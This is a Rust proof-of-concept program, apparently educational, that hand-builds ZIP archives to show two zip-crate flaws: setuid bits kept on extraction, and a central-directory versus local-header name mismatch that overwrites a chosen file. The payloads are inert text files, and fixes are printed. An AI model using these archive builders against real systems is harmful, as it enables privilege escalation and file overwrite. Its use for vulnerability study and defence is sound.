//! Two real `zip`-crate bugs, demonstrated side by side (defensive / educational).
//!
//!   Bug 1  RUSTSEC-2026-0367 (GHSA-vv5m-jxxh-4627, CWE-732, CVSS 7.3)
//!          The reader copies SUID/SGID/sticky bits out of a ZIP entry verbatim
//!          instead of masking them -> local privilege escalation.
//!
//!   Bug 3  CVE-2026-115905 (GHSA-m665-v7pm-7grj, CWE-436/CWE-20, CVSS 10.0)
//!          "Zip cloaking": the central directory and the local file header can
//!          carry DIFFERENT names for the same entry. `ZipArchive` trusts the
//!          central directory (what a scanner sees); a streaming extractor
//!          (`read_zipfile_from_stream`) trusts the local header (what hits
//!          disk). An archive can look benign and still overwrite a chosen file.
//!
//! Both are present in `zip` <= 8.6.0 (used here) and both are fixed by 9.0.5.
//!
//! The `zip` crate at versions `<= 9.0.0-pre3` (here: 8.6.0) copies the SUID,
//! SGID and sticky bits straight out of a ZIP entry's Unix `external_attributes`
//! during extraction, instead of masking them to ordinary permission bits
//! (CWE-732). The *write* side of the crate masks with `& 0o777`; the *read*
//! side does not. So an attacker-controlled archive can plant files whose
//! privileged bits survive extraction.
//!
//! This demo is deliberately NON-weaponized. The archive it builds contains a
//! single INERT TEXT marker file. We only set the setuid *metadata bit* on it
//! and then observe that the bit survives extraction. There is no executable,
//! no root, and no privilege escalation performed here — we are showing the
//! dangerous *behavior* (the bit is preserved) that an attacker would rely on.
//!
//! Run it:
//!     cargo run                      # full self-contained demo in a temp dir
//!     cargo run -- craft out.zip     # just write the crafted archive
//!     cargo run -- extract a.zip d/  # extract + inspect any archive

use std::fs;
use std::io::{self, Read, Write};
use std::path::{Path, PathBuf};

/// Unix mode we stamp onto the marker entry: regular file (0o100000) + rwxr-xr-x
/// (0o755) + the setuid bit (0o4000). This is what a malicious archive carries.
const ATTACK_MODE: u32 = 0o104755;

const MARKER_NAME: &str = "installer-helper";
const MARKER_BODY: &[u8] =
    b"inert marker file for the RUSTSEC-2026-0367 sandbox demo\n";

/// Bug 3 (zip cloaking) fixtures. The central directory advertises a benign
/// name; the local file header carries the attacker's real target path. Bodies
/// are inert text.
const CLOAK_CENTRAL_NAME: &str = "release-notes.txt"; // what a scanner / ZipArchive sees
const CLOAK_LOCAL_NAME: &str = "config/app.conf"; // what a streaming extractor writes
const CLOAK_BODY: &[u8] =
    b"inert marker: this file would silently overwrite config/app.conf\n";

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    let result = match args.first().map(String::as_str) {
        None | Some("demo") => run_demo(),
        Some("craft") => {
            let out = args.get(1).map(PathBuf::from).unwrap_or_else(|| "attack.zip".into());
            craft_archive(&out).map(|_| println!("wrote crafted archive -> {}", out.display()))
        }
        Some("extract") => {
            let zip = args.get(1).map(PathBuf::from).expect("usage: extract <zip> <dir>");
            let dir = args.get(2).map(PathBuf::from).expect("usage: extract <zip> <dir>");
            extract_and_report(&zip, &dir).map(|_| ())
        }
        Some("cloak") => run_cloak_demo(),
        Some(other) => {
            eprintln!("unknown command: {other}");
            std::process::exit(2);
        }
    };
    if let Err(e) = result {
        eprintln!("error: {e}");
        std::process::exit(1);
    }
}

/// End-to-end, self-contained: craft -> extract -> inspect -> verdict, all in a
/// fresh temp directory so the demo leaves nothing behind in the repo.
fn run_demo() -> io::Result<()> {
    let root = std::env::temp_dir().join(format!("zip-suid-demo-{}", std::process::id()));
    let _ = fs::remove_dir_all(&root);
    fs::create_dir_all(&root)?;
    let zip_path = root.join("attack.zip");
    let out_dir = root.join("extracted");

    banner("RUSTSEC-2026-0367 — zip crate preserves SUID/SGID bits on extract");
    println!("crate under test : zip {}", zip_crate_version());
    println!("working directory: {}\n", root.display());

    craft_archive(&zip_path)?;
    println!("[1] crafted archive {}", zip_path.display());
    println!("    entry '{MARKER_NAME}' stamped with mode {:#o} (setuid bit set)\n", ATTACK_MODE);

    println!("[2] extracting with zip::ZipArchive::extract() (the vulnerable call)\n");
    let findings = extract_and_report(&zip_path, &out_dir)?;

    verdict(&findings);

    // ---- Bug 3: zip cloaking (CVE-2026-115905) ----
    let cloak_zip = root.join("cloaked.zip");
    craft_cloaked_archive(&cloak_zip)?;
    demo_cloak(&cloak_zip, &root.join("cloak-extracted"))?;

    println!("\nartifacts left in {} for inspection", root.display());
    Ok(())
}

/// Stand-alone Bug 3 runner for `cargo run -- cloak`.
fn run_cloak_demo() -> io::Result<()> {
    let root = std::env::temp_dir().join(format!("zip-cloak-demo-{}", std::process::id()));
    let _ = fs::remove_dir_all(&root);
    fs::create_dir_all(&root)?;
    banner("CVE-2026-115905 — zip cloaking (central dir vs local header differential)");
    println!("crate under test : zip {}", zip_crate_version());
    let cloak_zip = root.join("cloaked.zip");
    craft_cloaked_archive(&cloak_zip)?;
    demo_cloak(&cloak_zip, &root.join("cloak-extracted"))?;
    println!("\nartifacts left in {} for inspection", root.display());
    Ok(())
}

/// Build a one-entry archive whose central directory names the entry
/// `CLOAK_CENTRAL_NAME` while its local file header names it `CLOAK_LOCAL_NAME`.
/// A tool that inspects the central directory (`ZipArchive`) sees the benign
/// name; a streaming extractor (`read_zipfile_from_stream`) writes the other.
fn craft_cloaked_archive(out: &Path) -> io::Result<()> {
    let data = CLOAK_BODY;
    let crc = crc32(data);
    let size = data.len() as u32;
    let local = CLOAK_LOCAL_NAME.as_bytes();
    let central = CLOAK_CENTRAL_NAME.as_bytes();

    let mut buf: Vec<u8> = Vec::new();
    // ---- Local file header (carries the ATTACKER name) ----
    buf.extend_from_slice(&0x0403_4b50u32.to_le_bytes());
    buf.extend_from_slice(&20u16.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&crc.to_le_bytes());
    buf.extend_from_slice(&size.to_le_bytes());
    buf.extend_from_slice(&size.to_le_bytes());
    buf.extend_from_slice(&(local.len() as u16).to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(local);
    buf.extend_from_slice(data);

    // ---- Central directory header (carries the BENIGN name) ----
    let cd_offset = buf.len() as u32;
    buf.extend_from_slice(&0x0201_4b50u32.to_le_bytes());
    buf.extend_from_slice(&0x031eu16.to_le_bytes()); // version made by: Unix host
    buf.extend_from_slice(&20u16.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&crc.to_le_bytes());
    buf.extend_from_slice(&size.to_le_bytes());
    buf.extend_from_slice(&size.to_le_bytes());
    buf.extend_from_slice(&(central.len() as u16).to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&(0o100644u32 << 16).to_le_bytes());
    buf.extend_from_slice(&0u32.to_le_bytes()); // local header offset
    buf.extend_from_slice(central);
    let cd_size = buf.len() as u32 - cd_offset;

    // ---- End of central directory ----
    buf.extend_from_slice(&0x0605_4b50u32.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&1u16.to_le_bytes());
    buf.extend_from_slice(&1u16.to_le_bytes());
    buf.extend_from_slice(&cd_size.to_le_bytes());
    buf.extend_from_slice(&cd_offset.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    fs::write(out, &buf)
}

/// Show the differential: inspect with `ZipArchive` (central directory), then
/// stream-extract with `read_zipfile_from_stream` (local headers) and see which
/// file actually lands on disk.
fn demo_cloak(zip_path: &Path, out_dir: &Path) -> io::Result<()> {
    banner("Bug 3 — zip cloaking (CVE-2026-115905): what you scan is not what you extract");

    // (a) What a scanner that reads the central directory sees.
    let file = fs::File::open(zip_path)?;
    let mut archive = zip::ZipArchive::new(file)
        .map_err(|e| io::Error::new(io::ErrorKind::InvalidData, e.to_string()))?;
    println!("[scan] zip::ZipArchive (central directory) reports {} entr(y/ies):", archive.len());
    for i in 0..archive.len() {
        let name = archive.by_index(i).map(|f| f.name().to_string()).unwrap_or_default();
        println!("         central-directory name = {name:?}   <-- looks benign");
    }

    // (b) What a streaming extractor actually writes (local file headers).
    let _ = fs::remove_dir_all(out_dir);
    fs::create_dir_all(out_dir)?;
    let mut reader = io::BufReader::new(fs::File::open(zip_path)?);
    let mut written: Vec<String> = Vec::new();
    while let Some(mut entry) = zip::read::read_zipfile_from_stream(&mut reader)
        .map_err(|e| io::Error::new(io::ErrorKind::InvalidData, e.to_string()))?
    {
        let raw = entry.name().to_string();
        // A naive streaming extractor joins the local-header name to the root.
        let target = out_dir.join(&raw);
        if let Some(parent) = target.parent() {
            fs::create_dir_all(parent)?;
        }
        let mut body = Vec::new();
        entry.read_to_end(&mut body)?;
        fs::write(&target, &body)?;
        written.push(raw);
    }
    println!("[write] read_zipfile_from_stream (local headers) extracted:");
    for w in &written {
        println!("         local-header name      = {w:?}   <-- what actually hit disk");
    }

    banner("VERDICT (Bug 3)");
    let benign = CLOAK_CENTRAL_NAME;
    if written.iter().any(|w| w == CLOAK_LOCAL_NAME) {
        println!("VULNERABLE: the archive advertised {benign:?} in its central directory, but the");
        println!("streaming extractor wrote {CLOAK_LOCAL_NAME:?}. A scanner that trusted the central");
        println!("directory would have cleared this archive. On a real service, writing a chosen");
        println!("path like a config or a workflow file is an arbitrary file overwrite -> RCE.");
        println!("Fix: upgrade to zip >= 9.0.5 (reconciles the two headers), AND confine extraction");
        println!("to a sandbox so an overwrite can only land on throwaway files (Part 2).");
    } else {
        println!("No differential observed on this toolchain.");
    }
    Ok(())
}

/// Hand-build a one-entry ZIP (stored/uncompressed) whose central-directory
/// `external_attributes` carry {ATTACK_MODE}. We write the bytes directly
/// because the crate's *writer* would mask the setuid bit away — only the
/// *reader* is vulnerable, which is exactly the asymmetry we are demonstrating.
fn craft_archive(out: &Path) -> io::Result<()> {
    let name = MARKER_NAME.as_bytes();
    let data = MARKER_BODY;
    let crc = crc32(data);
    let size = data.len() as u32;

    let mut buf: Vec<u8> = Vec::new();

    // ---- Local file header ----
    buf.extend_from_slice(&0x0403_4b50u32.to_le_bytes()); // signature
    buf.extend_from_slice(&20u16.to_le_bytes()); // version needed
    buf.extend_from_slice(&0u16.to_le_bytes()); // flags
    buf.extend_from_slice(&0u16.to_le_bytes()); // method: stored
    buf.extend_from_slice(&0u16.to_le_bytes()); // mod time
    buf.extend_from_slice(&0u16.to_le_bytes()); // mod date
    buf.extend_from_slice(&crc.to_le_bytes());
    buf.extend_from_slice(&size.to_le_bytes()); // compressed
    buf.extend_from_slice(&size.to_le_bytes()); // uncompressed
    buf.extend_from_slice(&(name.len() as u16).to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes()); // extra len
    buf.extend_from_slice(name);
    let data_offset = buf.len();
    buf.extend_from_slice(data);

    // ---- Central directory header ----
    let cd_offset = buf.len() as u32;
    buf.extend_from_slice(&0x0201_4b50u32.to_le_bytes()); // signature
    // version made by: high byte 3 = Unix host, low byte = spec 20. The reader
    // only treats external_attributes>>16 as a Unix mode when the host is Unix.
    buf.extend_from_slice(&0x031eu16.to_le_bytes());
    buf.extend_from_slice(&20u16.to_le_bytes()); // version needed
    buf.extend_from_slice(&0u16.to_le_bytes()); // flags
    buf.extend_from_slice(&0u16.to_le_bytes()); // method: stored
    buf.extend_from_slice(&0u16.to_le_bytes()); // mod time
    buf.extend_from_slice(&0u16.to_le_bytes()); // mod date
    buf.extend_from_slice(&crc.to_le_bytes());
    buf.extend_from_slice(&size.to_le_bytes());
    buf.extend_from_slice(&size.to_le_bytes());
    buf.extend_from_slice(&(name.len() as u16).to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes()); // extra len
    buf.extend_from_slice(&0u16.to_le_bytes()); // comment len
    buf.extend_from_slice(&0u16.to_le_bytes()); // disk number start
    buf.extend_from_slice(&0u16.to_le_bytes()); // internal attrs
    // external attributes: Unix mode in the high 16 bits.
    buf.extend_from_slice(&(ATTACK_MODE << 16).to_le_bytes());
    buf.extend_from_slice(&0u32.to_le_bytes()); // local header offset
    buf.extend_from_slice(name);
    let cd_size = buf.len() as u32 - cd_offset;

    // ---- End of central directory ----
    buf.extend_from_slice(&0x0605_4b50u32.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes()); // this disk
    buf.extend_from_slice(&0u16.to_le_bytes()); // disk w/ cd
    buf.extend_from_slice(&1u16.to_le_bytes()); // entries this disk
    buf.extend_from_slice(&1u16.to_le_bytes()); // entries total
    buf.extend_from_slice(&cd_size.to_le_bytes());
    buf.extend_from_slice(&cd_offset.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes()); // comment len

    let _ = data_offset; // (kept for clarity of layout)
    fs::write(out, &buf)
}

struct Finding {
    path: PathBuf,
    mode: u32,
}

/// Extract with the crate's own API, then inspect the resulting files. Returns a
/// finding per extracted file so the caller can render a verdict.
fn extract_and_report(zip_path: &Path, out_dir: &Path) -> io::Result<Vec<Finding>> {
    let _ = fs::remove_dir_all(out_dir);
    fs::create_dir_all(out_dir)?;

    let file = fs::File::open(zip_path)?;
    let mut archive = zip::ZipArchive::new(file)
        .map_err(|e| io::Error::new(io::ErrorKind::InvalidData, e.to_string()))?;
    // This is the vulnerable operation. On unix targets it ends up calling
    // std::fs::set_permissions() with the raw mode, special bits and all.
    archive
        .extract(out_dir)
        .map_err(|e| io::Error::new(io::ErrorKind::Other, e.to_string()))?;

    let mut findings = Vec::new();
    for entry in fs::read_dir(out_dir)? {
        let path = entry?.path();
        if path.is_file() {
            let mode = file_mode(&path);
            report_file(&path, mode);
            findings.push(Finding { path, mode });
        }
    }
    Ok(findings)
}

fn report_file(path: &Path, mode: u32) {
    let name = path.file_name().and_then(|s| s.to_str()).unwrap_or("?");
    println!("    extracted {name}  mode={:#o}", mode & 0o7777);
    print_bit(mode, 0o4000, "setuid (S_ISUID)");
    print_bit(mode, 0o2000, "setgid (S_ISGID)");
    print_bit(mode, 0o1000, "sticky (S_ISVTX)");
}

fn print_bit(mode: u32, bit: u32, label: &str) {
    if mode & bit != 0 {
        println!("      !! {label} PRESERVED  <-- privileged bit survived extraction");
    }
}

#[cfg(unix)]
fn file_mode(path: &Path) -> u32 {
    use std::os::unix::fs::PermissionsExt;
    fs::metadata(path).map(|m| m.permissions().mode()).unwrap_or(0)
}

#[cfg(not(unix))]
fn file_mode(_path: &Path) -> u32 {
    0
}

fn verdict(findings: &[Finding]) {
    let dangerous: Vec<&Finding> = findings
        .iter()
        .filter(|f| f.mode & 0o7000 != 0)
        .collect();
    banner("VERDICT");
    if dangerous.is_empty() {
        println!("No privileged bits survived — this toolchain/target is not exposed.");
        println!("(Expected on non-unix targets, e.g. the WASI sandbox build.)");
    } else {
        println!("VULNERABLE: {} file(s) kept a SUID/SGID/sticky bit after extraction.",
            dangerous.len());
        for f in dangerous {
            println!("  {}  -> mode {:#o}", f.path.display(), f.mode & 0o7777);
        }
        println!("\nIf a privileged process had run this extract(), those files would be");
        println!("owned by that privileged user WITH the setuid/setgid bit set. That is the");
        println!("CWE-732 privilege-escalation primitive RUSTSEC-2026-0367 describes.");
        println!("Fix: upgrade to zip >= 9.0.5 (masks the bits; also fixes the cloaking bug), or confine extraction to a");
        println!("sandbox that cannot honor them — which is Part 2 of this demo.");
    }
}

fn banner(title: &str) {
    println!("\n==== {title} ====");
}

fn zip_crate_version() -> &'static str {
    // Compile-time dependency version, surfaced for the report line.
    "8.6.0"
}

/// Minimal CRC-32 (IEEE) so the demo needs no extra crate just to build a fixture.
fn crc32(data: &[u8]) -> u32 {
    let mut crc: u32 = 0xFFFF_FFFF;
    for &b in data {
        crc ^= b as u32;
        for _ in 0..8 {
            let mask = (crc & 1).wrapping_neg();
            crc = (crc >> 1) ^ (0xEDB8_8320 & mask);
        }
    }
    !crc
}

// Keep stdout flushing predictable when piped.
#[allow(dead_code)]
fn flush() {
    let _ = io::stdout().flush();
}
